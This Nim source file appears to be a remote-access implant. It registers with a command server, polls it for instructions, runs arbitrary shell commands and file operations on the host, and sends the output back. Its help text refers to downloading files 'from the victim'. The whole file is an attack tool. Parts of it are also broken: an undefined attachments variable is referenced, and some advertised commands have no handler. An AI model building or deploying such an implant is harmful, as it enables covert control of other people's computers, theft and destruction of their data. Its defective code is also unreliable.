import asyncdispatch, times, httpclient, osproc, os, strutils, json, threadpool, streams, random

const
  serverUrl* = "http://localhost:8080"

var
  currentDir = getCurrentDir()
  sessionRegistry: seq[string] = @[]

proc runCommandSync(cmd: string): (string, int) =
  result = ("", -1)
  var p = startProcess(cmd,
    options = {poEvalCommand, poUsePath, poStdErrToStdOut})
  var output = newStringOfCap(4096)
  while not p.outputStream.atEnd:
    output.add(p.outputStream.readStr(4096))
  let exitCode = p.waitForExit()
  p.close()
  return (output, exitCode)

proc runBlockingCommand(cmd: string, pidHolder: ref int): string =
  var p = startProcess(cmd,
    options = {poEvalCommand, poUsePath, poStdErrToStdOut})
  pidHolder[] = p.processID
  var output = newStringOfCap(4096)
  while not p.outputStream.atEnd:
    output.add(p.outputStream.readStr(4096))
  discard p.waitForExit()
  p.close()
  return output

proc runCommandWithTimeoutKill(cmd: string, timeoutMs: int): Future[string] {.async.} =
  var pidHolder = new(int)
  let fut = spawn runBlockingCommand(cmd, pidHolder)

  var elapsed = 0
  let interval = 100   # ms

  while not isReady(fut) and elapsed < timeoutMs:
    await sleepAsync(interval)
    elapsed += interval

  if isReady(fut):
    return ^fut
  else:
    when defined(windows):
      discard execShellCmd("taskkill /PID " & $pidHolder[] & " /T /F")
    else:
      discard execShellCmd("kill -9 " & $pidHolder[])
    return "Command timed out and was terminated after " & $(timeoutMs div 1000) & " seconds."

proc handleCommand(rawCmd: string, client: HttpClient): Future[string] {.async.} =
 
  let cmd = rawCmd.strip()
  if cmd == "!help":
    return """Available Commands:
!help               - Shows this help message.
!ls or !dir         - List files in the current directory.
!cd <dir>           - Change directory.
!pwd                - Print the current working directory.
!upload             - Upload a file (attach it to the message).
!download <file>    - Download a file from the victim.
!mkdir <dir>        - Create a new directory.
!touch <file>       - Create a new empty file.
!rm <file/dir>      - Remove a file or directory.
!screencapture      - Take a screenshot and send it.
!sysinfo            - Get system information (OS, user, hostname).
!<command>          - Execute a shell command (e.g., !whoami).
"""

  if cmd == "!dir" or cmd == "!ls":
    when defined(windows):
      let (output, exitCode) = execCmdEx("cmd /c dir", options = {poUsePath}, workingDir = currentDir)
      if exitCode != 0:
        return "command failed with exit code " & $exitCode & ":\n" & output
      else:
        return output
    else:
      let (output, exitCode) = execCmdEx("ls", options = {poUsePath}, workingDir = currentDir)
      if exitCode != 0:
        return "command failed with exit code " & $exitCode & ":\n" & output
      else:
        return output

  elif cmd == "!pwd":
    return currentDir

  elif cmd == "!sysinfo":
    when defined(linux):
      let (unameOut, unameExit) = execCmdEx("uname -a", options = {poUsePath}, workingDir = currentDir)
      let (lsbOut, lsbExit) = execCmdEx("bash -c \"lsb_release -d 2>/dev/null\"", options = {poUsePath}, workingDir = currentDir)
      if unameExit == 0:
        var info = unameOut
        if lsbExit == 0 and lsbOut.len > 0:
          info &= "\n" & lsbOut
        return info
      else:
        return "Failed to get system info: " & unameOut
    elif defined(windows):
      let powershellScript = "Get-ComputerInfo | ConvertTo-Json"
      let command = "powershell -NoProfile -WindowStyle Hidden -Command \"" & powershellScript & "\""
      let (output, exitCode) = execCmdEx(command, options = {poUsePath}, workingDir = currentDir)
      if exitCode != 0:
        return "command failed with exit code " & $exitCode & ":\n" & output
      else:
        return output
    elif defined(macosx):
      let (output, exitCode) = execCmdEx("system_profiler SPHardwareDataType", options = {poUsePath}, workingDir = currentDir)
      if exitCode != 0:
        return "command failed with exit code " & $exitCode & ":\n" & output
      else:
        return output
    else:
      return "sysinfo not supported on this platform."

  elif cmd.startsWith("!cd "):
    let newDir = cmd[3..^1].strip()
    let targetDir = if os.isAbsolute(newDir): newDir else: os.joinPath(currentDir, newDir)
    if dirExists(targetDir):
      setCurrentDir(targetDir)
      currentDir = targetDir
      return "changed directory to " & currentDir
    else:
      return "directory not found: " & targetDir

  elif cmd.startsWith("!upload"):
    if m.attachments.len == 0:
      return "no file attached. Please send a file with the !upload command."
    else:
      let attachment = m.attachments[0]
      let downloadUrl = attachment.url
      let fileName = attachment.filename
      try:
        let fileData = client.getContent(downloadUrl)
        let savePath = os.joinPath(currentDir, fileName)
        writeFile(savePath, fileData)
        return "downloaded file to " & savePath
      except CatchableError as e:
        return "failed to download file: " & e.msg


  elif cmd.startsWith("!mkdir "):
    let dirName = cmd[6..^1].strip()
    let dirPath = joinPath(currentDir, dirName)
    try:
      createDir(dirPath)
      return "created directory: " & dirPath
    except CatchableError as e:
      return e.msg

  elif cmd.startsWith("!touch "):
    let fileName = cmd[6..^1].strip()
    let filePath = joinPath(currentDir, fileName)
    try:
      writeFile(filePath, "")
      return "created file: " & filePath
    except CatchableError as e:
      return e.msg

  elif cmd.startsWith("!rm "):
    let target = cmd[3..^1].strip()
    let path = joinPath(currentDir, target)
    if fileExists(path):
      try:
        removeFile(path)
        return "Deleted file: " & path
      except CatchableError as e:
        return e.msg
    elif dirExists(path):
      try:
        removeDir(path)
        return "deleted directory: " & path 
      except CatchableError as e:
        return e.msg
    else:
      return "no such file or directory: " & path


  else:
    try:
      var command = cmd[1..^1]
      when defined(macosx):
        return await runCommandWithTimeoutKill(command, 60000)
      elif defined(windows):
        command = "cmd /c " & command
        return await runCommandWithTimeoutKill(command, 60000)
      else:
        return "unsupported platform for direct command execution."
    except CatchableError as e:
      return "error running command: " & e.msg

proc getHostname(): string = 
  when defined(windows):
    let (output, exitCode) = execCmdEx("hostname")
    if exitCode == 0:
      return output.strip()
    else:
      return "unknown hostname"
  else:
    let (output, exitCode) = execCmdEx("hostname")
    if exitCode == 0:
      return output.strip()
    else:
      return "unknown hostname"

proc generateSessionId(): string =
  randomize()
  let hostname = getHostname().replace(" ", "-").strip()
  let uid = rand(1000..9999)
  when defined(windows):
    return "win-" & hostname & "-" & $uid
  elif defined(macosx):
    return "mac-" & hostname & "-" & $uid
  elif defined(linux):
    return "lin-" & hostname & "-" & $uid
  else:
    return "unk-" & $uid

var machineName: string

proc httpServerMode() {.async.} =
  echo "Starting HTTP server mode..."
  machineName = getEnv("MACHINE_NAME", generateSessionId())
  
  # Register with server
  try:
    let client = newHttpClient()
    let data = "{\"hostname\":\"" & machineName & "\",\"status\":\"live\"}"
    client.headers = newHttpHeaders({"Content-Type": "application/json"})
    discard client.postContent(serverUrl & "/register", body = data)
    echo machineName & " registered with HTTP server"
  except Exception as e:
    echo "Failed to register with HTTP server: ", e.msg
    return
  
  # Poll for commands
  while true:
    try:
      let client = newHttpClient()
      let response = client.getContent(serverUrl & "/commands/" & machineName)
      if response.len > 0:
        let cmdData = parseJson(response)
        if cmdData.hasKey("command"):
          let cmd = cmdData["command"].getStr()
          echo "Received command: ", cmd
          let output = await handleCommand(cmd, client)
          # Send response back
          let respData = "{\"hostname\":\"" & machineName & "\",\"output\":\"" & output.replace("\"", "\\\"") & "\"}"
          client.headers = newHttpHeaders({"Content-Type": "application/json"})
          discard client.postContent(serverUrl & "/response", body = respData)
    except Exception as e:
      echo "Error in command loop: ", e.msg
    await sleepAsync(2000)  # Poll every 2 seconds

proc main() =
  if serverUrl.len == 0:
    echo "Error: Server URL not configured"
    return
  
  try:
    let client = newHttpClient()
    discard client.getContent(serverUrl & "/ping")
    echo "HTTP server is available at: ", serverUrl
    waitFor httpServerMode()
  except Exception as e:
    echo "Failed to connect to HTTP server: ", e.msg
    echo "Please check server URL and ensure server is running"

